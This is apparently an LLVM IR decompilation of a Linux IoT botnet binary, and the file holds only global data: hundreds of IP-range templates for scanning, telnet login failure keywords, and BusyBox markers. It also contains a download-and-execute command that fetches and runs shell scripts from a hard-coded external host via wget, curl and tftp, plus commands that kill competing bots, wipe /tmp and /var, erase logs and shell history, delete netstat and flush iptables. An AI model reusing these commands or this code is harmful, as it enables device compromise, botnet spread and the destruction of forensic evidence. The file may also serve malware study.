source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_805d00c.2 = global i32 0
@global_var_805d024.3 = local_unnamed_addr global i32* @global_var_805d00c.2
@global_var_805c984.4 = constant i32 0
@global_var_805d010.6 = local_unnamed_addr global i32 0
@global_var_805d4a0.7 = global i32 0
@global_var_805d4a4.8 = local_unnamed_addr global i32 0
@global_var_805d4a8.9 = local_unnamed_addr global i32 0
@global_var_805d0f8.10 = local_unnamed_addr global i32 4095
@global_var_805d0f4.11 = local_unnamed_addr global i32 362436
@global_var_805814d.12 = constant [7 x i8] c"(null)\00"
@global_var_8058154.14 = constant [3 x i8] c"-c\00"
@global_var_8058157.15 = constant [3 x i8] c"sh\00"
@global_var_805815a.16 = constant [8 x i8] c"/bin/sh\00"
@global_var_8058180.17 = constant i32 -1
@global_var_8058580.18 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_805858e.19 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_805d480.20 = local_unnamed_addr global i32 0
@global_var_8058597.21 = constant [5 x i8] c"PING\00"
@global_var_805859c.22 = constant [14 x i8] c"gethostbyname\00"
@global_var_805d488.23 = local_unnamed_addr global i32 0
@global_var_805d48c.24 = local_unnamed_addr global i32 0
@global_var_8063714.25 = local_unnamed_addr global i32 0
@global_var_80585aa.26 = constant [6 x i8] c":>%$#\00"
@global_var_80585b1.31 = constant [12 x i8] c"112.5.%d.%d\00"
@global_var_80585bd.32 = constant [14 x i8] c"117.165.%d.%d\00"
@global_var_80585cb.33 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_80585d6.34 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_80585e3.35 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_80585ee.36 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_80585fb.37 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_8058607.38 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_8058614.39 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_8058621.40 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_805862e.41 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_805863c.42 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_8058647.43 = constant [13 x i8] c"41.254.%d.%d\00"
@global_var_8058654.44 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_8058661.45 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_805866e.46 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_805867b.47 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_8058688.48 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_8058695.49 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_80586a2.50 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_80586ad.51 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_80586b9.52 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_80586c6.53 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_80586d1.54 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_80586dc.55 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_80586e8.56 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_80586f4.57 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_8058700.58 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_805870d.59 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_805871a.60 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_8058726.61 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_8058733.62 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_805873f.63 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_805874a.64 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_8058756.65 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_8058762.66 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_805876e.67 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_805877a.68 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_8058786.69 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_8058793.70 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_80587a0.71 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_80587ad.72 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_80587ba.73 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_80587c7.74 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_80587d4.75 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_80587e1.76 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_80587ee.77 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_80587fb.78 = constant [13 x i8] c"103.54.%d.%d\00"
@global_var_8058808.79 = constant [13 x i8] c"27.255.%d.%d\00"
@global_var_8058815.80 = constant [14 x i8] c"103.204.%d.%d\00"
@global_var_8058823.81 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_8058830.82 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_805883e.83 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_805884b.84 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_8058859.85 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_8058867.86 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_8058874.87 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_8058881.88 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_805888e.89 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_805889b.90 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_80588a8.91 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_80588b5.92 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_80588c2.93 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_80588cf.94 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_80588dc.95 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_80588e9.96 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_80588f6.97 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_8058903.98 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_8058910.99 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_805891d.100 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_805892a.101 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_8058937.102 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_8058944.103 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_8058951.104 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_805895e.105 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_805896b.106 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_8058978.107 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_8058985.108 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_8058992.109 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_805899f.110 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_80589ac.111 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_80589b9.112 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_80589c6.113 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_80589d3.114 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_80589e0.115 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_80589ed.116 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_80589fa.117 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_8058a07.118 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_8058a14.119 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_8058a21.120 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_8058a2e.121 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_8058a3b.122 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_8058a48.123 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_8058a55.124 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_8058a62.125 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_8058a6f.126 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_8058a7c.127 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_8058a89.128 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_8058a96.129 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_8058aa2.130 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_8058aaf.131 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_8058abc.132 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_8058ac9.133 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_8058ad5.134 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_8058ae2.135 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_8058af0.136 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_8058afe.137 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_8058b0b.138 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_8058b19.139 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_8058b27.140 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_8058b34.141 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_8058b42.142 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_8058b4f.143 = constant [13 x i8] c"103.44.%d.%d\00"
@global_var_8058b5c.144 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_8058b6a.145 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_8058b78.146 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_8058b86.147 = constant [14 x i8] c"117.175.%d.%d\00"
@global_var_8058b94.148 = constant [13 x i8] c"178.93.%d.%d\00"
@global_var_8058ba1.149 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_8058bad.150 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_8058bbb.151 = constant [14 x i8] c"113.174.%d.%d\00"
@global_var_8058bc9.152 = constant [14 x i8] c"113.160.%d.%d\00"
@global_var_8058bd7.153 = constant [14 x i8] c"113.161.%d.%d\00"
@global_var_8058be5.154 = constant [14 x i8] c"113.162.%d.%d\00"
@global_var_8058bf3.155 = constant [14 x i8] c"113.163.%d.%d\00"
@global_var_8058c01.156 = constant [14 x i8] c"113.164.%d.%d\00"
@global_var_8058c0f.157 = constant [14 x i8] c"113.165.%d.%d\00"
@global_var_8058c1d.158 = constant [14 x i8] c"113.166.%d.%d\00"
@global_var_8058c2b.159 = constant [14 x i8] c"113.167.%d.%d\00"
@global_var_8058c39.160 = constant [14 x i8] c"113.168.%d.%d\00"
@global_var_8058c47.161 = constant [14 x i8] c"113.169.%d.%d\00"
@global_var_8058c55.162 = constant [13 x i8] c"123.17.%d.%d\00"
@global_var_8058c62.163 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_8058c6f.164 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_8058c7c.165 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_8058c89.166 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_8058c96.167 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_8058ca3.168 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_8058cb1.169 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_8058cbf.170 = constant [14 x i8] c"222.255.%d.%d\00"
@global_var_8058ccd.171 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_8058cda.172 = constant [13 x i8] c"41.208.%d.%d\00"
@global_var_8058ce7.173 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_8058cf5.174 = constant [14 x i8] c"175.201.%d.%d\00"
@global_var_8058d03.175 = constant [14 x i8] c"103.198.%d.%d\00"
@global_var_8058d11.176 = constant [13 x i8] c"50.205.%d.%d\00"
@global_var_8058d1e.177 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_8058d2b.178 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_8058d38.179 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_8058d45.180 = constant [13 x i8] c"85.105.%d.%d\00"
@global_var_8058d52.181 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_8058d5e.182 = constant [14 x i8] c"103.203.%d.%d\00"
@global_var_8058d6c.183 = constant [13 x i8] c"103.55.%d.%d\00"
@global_var_8058d79.184 = constant [14 x i8] c"103.220.%d.%d\00"
@global_var_8058d87.185 = constant [14 x i8] c"183.233.%d.%d\00"
@global_var_8058d95.186 = constant [14 x i8] c"103.242.%d.%d\00"
@global_var_8058da3.187 = constant [13 x i8] c"103.14.%d.%d\00"
@global_var_8058db0.188 = constant [14 x i8] c"103.195.%d.%d\00"
@global_var_8058dbe.189 = constant [14 x i8] c"103.214.%d.%d\00"
@global_var_8058dcc.190 = constant [14 x i8] c"103.218.%d.%d\00"
@global_var_8058dda.191 = constant [14 x i8] c"103.225.%d.%d\00"
@global_var_8058de8.192 = constant [14 x i8] c"103.228.%d.%d\00"
@global_var_8058df6.193 = constant [14 x i8] c"103.231.%d.%d\00"
@global_var_8058e04.194 = constant [13 x i8] c"103.60.%d.%d\00"
@global_var_8058e11.195 = constant [14 x i8] c"103.248.%d.%d\00"
@global_var_8058e1f.196 = constant [14 x i8] c"103.253.%d.%d\00"
@global_var_8058e2d.197 = constant [14 x i8] c"103.255.%d.%d\00"
@global_var_8058e3b.198 = constant [13 x i8] c"103.35.%d.%d\00"
@global_var_8058e48.199 = constant [13 x i8] c"103.49.%d.%d\00"
@global_var_8058e55.200 = constant [13 x i8] c"103.62.%d.%d\00"
@global_var_8058e62.201 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_8058e6f.202 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_8058e7c.203 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_8058e89.204 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_8058e96.205 = constant [14 x i8] c"113.176.%d.%d\00"
@global_var_8058ea4.206 = constant [14 x i8] c"113.175.%d.%d\00"
@global_var_8058eb2.207 = constant [14 x i8] c"113.177.%d.%d\00"
@global_var_8058ec0.208 = constant [14 x i8] c"113.183.%d.%d\00"
@global_var_8058ece.209 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_8058edc.210 = constant [14 x i8] c"203.134.%d.%d\00"
@global_var_8058eea.211 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_8058ef7.212 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_8058f04.213 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_8058f12.214 = constant [14 x i8] c"117.181.%d.%d\00"
@global_var_8058f20.215 = constant [14 x i8] c"117.178.%d.%d\00"
@global_var_8058f2e.216 = constant [14 x i8] c"117.177.%d.%d\00"
@global_var_8058f3c.217 = constant [14 x i8] c"117.176.%d.%d\00"
@global_var_8058f4a.218 = constant [14 x i8] c"117.170.%d.%d\00"
@global_var_8058f58.219 = constant [14 x i8] c"117.171.%d.%d\00"
@global_var_8058f66.220 = constant [14 x i8] c"117.162.%d.%d\00"
@global_var_8058f74.221 = constant [13 x i8] c"112.26.%d.%d\00"
@global_var_8058f81.222 = constant [13 x i8] c"112.27.%d.%d\00"
@global_var_8058f8e.223 = constant [13 x i8] c"112.28.%d.%d\00"
@global_var_8058f9b.224 = constant [13 x i8] c"112.29.%d.%d\00"
@global_var_8058fa8.225 = constant [13 x i8] c"112.30.%d.%d\00"
@global_var_8058fb5.226 = constant [13 x i8] c"112.31.%d.%d\00"
@global_var_8058fc2.227 = constant [14 x i8] c"203.150.%d.%d\00"
@global_var_8058fd0.228 = constant [13 x i8] c"50.233.%d.%d\00"
@global_var_805d100.229 = global i32 110
@global_var_8058fdd.231 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_8058141.233 = constant [8 x i8] c"BusyBox\00"
@global_var_8058149.234 = constant i32 2293796
@global_var_805814b.235 = constant i32 1848115235
@global_var_805d0a0.236 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8058141.233, i32 0, i32 0), i8* bitcast (i32* @global_var_8058149.234 to i8*), i8* bitcast (i32* @global_var_805814b.235 to i8*)]
@global_var_8058115.237 = constant [7 x i8] c"nvalid\00"
@global_var_805811c.238 = constant [6 x i8] c"ailed\00"
@global_var_8058122.239 = constant [9 x i8] c"ncorrect\00"
@global_var_805812b.240 = constant [6 x i8] c"enied\00"
@global_var_8058131.241 = constant [5 x i8] c"rror\00"
@global_var_8058136.242 = constant [7 x i8] c"oodbye\00"
@global_var_805813d.243 = constant [4 x i8] c"bad\00"
@global_var_805d080.244 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8058115.237, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805811c.238, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8058122.239, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805812b.240, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8058131.241, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8058136.242, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805813d.243, i32 0, i32 0)]
@global_var_805d064 = external global i32
@global_var_8058fe9.249 = constant [3 x i8] c"\0D\0A\00"
@global_var_805d0c0.250 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8058115.237, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805811c.238, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8058122.239, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805812b.240, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8058131.241, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8058136.242, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805813d.243, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8058141.233, i32 0, i32 0), i8* bitcast (i32* @global_var_8058149.234 to i8*), i8* bitcast (i32* @global_var_805814b.235 to i8*)]
@global_var_8058fec.251 = constant i32 993024795
@global_var_8059055.252 = constant [16 x i8] c"REPORT %s:%s:%s\00"
@global_var_8057fc0.253 = constant [318 x i8] c"cd /tmp; wget http://188.213.170.176/gtop.sh || curl -O http://188.213.170.176/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\0D\0A\00"
@global_var_805d060.254 = local_unnamed_addr global [318 x i8]* @global_var_8057fc0.253
@global_var_8059090.256 = constant [327 x i8] c"%s cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\0D\0A x00\00"
@global_var_80591d8.257 = constant [320 x i8] c"cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\0D\0A\00"
@global_var_805949c.258 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_80594ab.259 = constant [6 x i8] c"/tmp/\00"
@global_var_80594b1.260 = constant [6 x i8] c"/var/\00"
@global_var_80594b7.261 = constant [6 x i8] c"/dev/\00"
@global_var_80594bd.262 = constant [10 x i8] c"/var/run/\00"
@global_var_80594c7.263 = constant [10 x i8] c"/dev/shm/\00"
@global_var_80594d1.264 = constant [6 x i8] c"/mnt/\00"
@global_var_80594d7.265 = constant [7 x i8] c"/boot/\00"
@global_var_80594de.266 = constant [6 x i8] c"/usr/\00"
@global_var_8059500.267 = constant [9 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_805949c.258, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80594ab.259, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80594b1.260, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80594b7.261, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80594bd.262, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80594c7.263, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80594d1.264, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80594d7.265, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80594de.266, i32 0, i32 0)]
@global_var_80593e0.268 = constant [5 x i8] c"wget\00"
@global_var_80593e5.269 = constant [6 x i8] c"armv*\00"
@global_var_8059366.270 = constant [5 x i8] c"bot*\00"
@global_var_80593eb.271 = constant [6 x i8] c"ntpd*\00"
@global_var_8059376.272 = constant [7 x i8] c"hackz*\00"
@global_var_80593f1.273 = constant [8 x i8] c"shitty*\00"
@global_var_80593f9.274 = constant [6 x i8] c"jack*\00"
@global_var_8059346.275 = constant [6 x i8] c"mips*\00"
@global_var_805932e.276 = constant [5 x i8] c"sex*\00"
@global_var_80593ff.277 = constant [4 x i8] c"i86\00"
@global_var_8059403.278 = constant [5 x i8] c"ssh*\00"
@global_var_8059361.279 = constant [5 x i8] c"sh4*\00"
@global_var_805936b.280 = constant [11 x i8] c"jackmeoff*\00"
@global_var_8059333.281 = constant [6 x i8] c"tftp*\00"
@global_var_8059408.282 = constant [4 x i8] c"i56\00"
@global_var_805940c.283 = constant [5 x i8] c"mips\00"
@global_var_8059411.284 = constant [7 x i8] c"mipsel\00"
@global_var_8059418.285 = constant [4 x i8] c"sh4\00"
@global_var_805941c.286 = constant [4 x i8] c"x86\00"
@global_var_8059420.287 = constant [5 x i8] c"i686\00"
@global_var_8059425.288 = constant [4 x i8] c"ppc\00"
@global_var_8059429.289 = constant [5 x i8] c"i586\00"
@global_var_8059440.290 = constant [23 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80593e0.268, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80593e5.269, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059366.270, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80593eb.271, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059376.272, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80593f1.273, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80593f9.274, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059346.275, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805932e.276, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80593ff.277, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059403.278, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059361.279, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805936b.280, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059333.281, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059408.282, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805940c.283, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059411.284, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059418.285, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805941c.286, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059420.287, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059425.288, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059429.289, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059429.289, i32 0, i32 0)]
@global_var_8059318.291 = constant [8 x i8] c"jackmy*\00"
@global_var_8059320.292 = constant [9 x i8] c"busybox*\00"
@global_var_8059329.293 = constant [5 x i8] c"bin*\00"
@global_var_8059339.294 = constant [5 x i8] c"arm*\00"
@global_var_805933e.295 = constant [8 x i8] c"mipsel*\00"
@global_var_805934c.296 = constant [8 x i8] c"mips64*\00"
@global_var_8059354.297 = constant [6 x i8] c"i686*\00"
@global_var_805935a.298 = constant [7 x i8] c"sparc*\00"
@global_var_805937d.299 = constant [6 x i8] c"bruv*\00"
@global_var_80593a0.300 = constant [16 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8059318.291, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8059320.292, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059329.293, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805932e.276, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059333.281, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059339.294, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805933e.295, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059346.275, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805934c.296, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059354.297, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805935a.298, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059361.279, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059366.270, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805936b.280, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8059376.272, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805937d.299, i32 0, i32 0)]
@global_var_8059528.301 = constant [100 x i8] c">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\0D\0A\00"
@global_var_80595a9.303 = constant [14 x i8] c"pkill -9 %s\0D\0A\00"
@global_var_80595b8.304 = constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00"
@global_var_80595e3.305 = constant [21 x i8] c"rm -rf /var/log/wtmp\00"
@global_var_80595f8.306 = constant [22 x i8] c"history -c;history -w\00"
@global_var_805960e.307 = constant [14 x i8] c"rm -rf /tmp/*\00"
@global_var_805961c.308 = constant [11 x i8] c"history -c\00"
@global_var_8059627.309 = constant [23 x i8] c"rm -rf ~/.bash_history\00"
@global_var_805963e.310 = constant [20 x i8] c"rm -rf /bin/netstat\00"
@global_var_8059652.311 = constant [11 x i8] c"history -w\00"
@global_var_805965d.312 = constant [17 x i8] c"pkill -9 busybox\00"
@global_var_805966e.313 = constant [14 x i8] c"pkill -9 perl\00"
@global_var_805967c.314 = constant [22 x i8] c"service iptables stop\00"
@global_var_8059694.315 = constant [36 x i8] c"/sbin/iptables -F;/sbin/iptables -X\00"
@global_var_80596b8.316 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_80596f8.317 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
